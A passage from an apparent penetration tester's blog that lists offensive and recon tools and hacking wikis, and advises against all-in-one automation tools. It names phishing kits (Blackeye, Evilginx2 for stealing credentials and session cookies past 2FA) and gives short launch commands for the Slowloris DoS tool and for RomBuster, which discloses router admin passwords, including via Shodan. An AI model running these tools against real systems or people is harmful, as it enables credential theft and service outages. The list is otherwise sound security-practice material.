[pyWhat](https://github.com/bee-san/pyWhat) identify anything. pyWhat easily lets you identify emails, IP addresses, and more. Feed it a .pcap file or some text and it’ll tell you what it is!

### Other

Here are some tools that can be used depending on the findings and specific tasks. I have used them at least once in the past.

[Bluing](https://github.com/fO-000/bluing) an intelligence gathering tool for hacking Bluetooth.

Some steganography tools that I use more for CTF or labs: [binwalk](https://github.com/ReFirmLabs/binwalk), File [stegosuite](https://github.com/osde8info/stegosuite), [stegextract](https://github.com/evyatarmeged/stegextract), stegsolver, [steghide](https://github.com/StefanoDeVuono/steghide),

[Blackeye](https://github.com/EricksonAtHome/blackeye) cool phishing tool with localtunnel.

```bash
bash blackeye.sh
```

[Evilginx2](https://github.com/kgretzky/evilginx2) - standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication.

[Slowloris](https://github.com/gkbrk/slowloris) low bandwidth DoS tool.

```bash
python3 slowloris.py example.com
```

[Arsenal](https://github.com/Orange-Cyberdefense/arsenal) is just a quick inventory and launcher for hacking programs, in case you forgot any command :)

[ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner) to scan for Apache Tomcat server vulnerabilities.

```bash
apachetomcatscanner -tt IP -tp - --list-cves
```

[RomBuster](https://github.com/EntySec/RomBuster) is a router exploitation tool that allows to disclosure network router admin password.

```bash
rombuster -a 192.168.99.1
rombuster --shodan <SHODAN_API>
```

[onionscout](https://github.com/h0ek/onionscout) - lightweight CLI for basic security-checks of Tor hidden services (.onion).

```bash
onionscout -u <ONION_URL>
```

[UUID Tools](https://www.uuidtools.com/decode) - UUID Decoder Online

[CyberChef](https://gchq.github.io/CyberChef/) - The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis.

[Hashes.com](https://hashes.com/) - is a hash lookup service. You can identify, decrypt, verify, decode etc.

[waybackurls](https://github.com/tomnomnom/waybackurls) - Fetch all the URLs that the Wayback Machine knows about for a domain.

```bash
cat domains.txt | waybackurls > urls
```

## Additional materials

When my scans and tests find something new or in need of development, or I am unfamiliar with a particular service, software or port, I look to various hacking wikis and cheat sheets for information on what to do next. I’ve always dreamed of creating one of my own, but again, that would take time and commitment, and the ones you’ll find below are perfect. Perhaps in the future, when this article has grown (yes, imagine it can be longer - [that’s what she said](https://www.youtube.com/watch?v=OcEi2o8g2L0)), I will rework it into its own wiki. (Damn during this article I even started testing [MkDocs](https://www.mkdocs.org/), [MkDocs for Material](https://squidfunk.github.io/mkdocs-material/), [TeeDoc](https://teedoc.github.io/get_started/en/usage/sites.html) and [Docusaurus](https://docusaurus.io/), the last one looks the best after testing, so maybe in the near future… because why not fuck my time).

Ok but here is a list of sites where I look when I lack knowledge on a particular subject:

- <https://book.hacktricks.xyz/>
- <https://www.ired.team/>
- <https://cheatsheet.haax.fr/>
- <https://www.thehacker.recipes/>
- <https://chryzsh.gitbooks.io/pentestbook/content/>
- <https://viperone.gitbook.io/pentest-everything>
- <https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/>
- <https://hausec.com/>
- <https://hideandsec.sh/>
- <https://redteam.guide/docs/checklists/red-team-checklist>

And great mind maps with tools for hacking, in fact, each of these maps can be a separate instruction on which tools to use for a given scenario or service. Fruitfully waste precious life minutes when browsing through such a large repository of knowledge. Because why not fuck your time!

- <https://github.com/Ignitetechnologies/Mindmap>

One more thing, do not use too many multitools or magic all in one great bounty hunter helper. There are a lot of new projects that automate things between the various tools I listed above. For example [scan4all](https://github.com/GhostTroops/scan4all), or [rekono](https://github.com/pablosnt/rekono) and many more. These projects are cool until they are developed and maintained, but in the end they are short-lived and have a lot of bugs. There is no one tool that will do everything for you and give you a report that you can send out and get a bounty on. So when you see a tool that has Nikto, Sublister, SQLMap, Gobuster and more in its dependencies, it just means that it is an overlay that runs these tools in the background, collects results from them and possibly passes between modules. Nothing that can really help you. If you want to automate something yourself, write a simple script that does one thing, then passes it on, and you still have to analyse the result at the end. Automation is great, but too much automation leads to errors and you may miss something. It’s a shame to waste a whole day on a scan that turns out to be wrong or miss something. The only thing these tools are useful for a newbie is to understand the steps and the tools used, you can follow their logic and recreate steps for yourself to understand the basics. On the above list you could find some kind of automation tools, but I choose only those that are related to single task, a narrow range of activities in one category.

See also [PentestGPT](https://github.com/GreyDGL/PentestGPT). AI is trendy now. YOU MUST USE IT or you are not cool. Not cool.
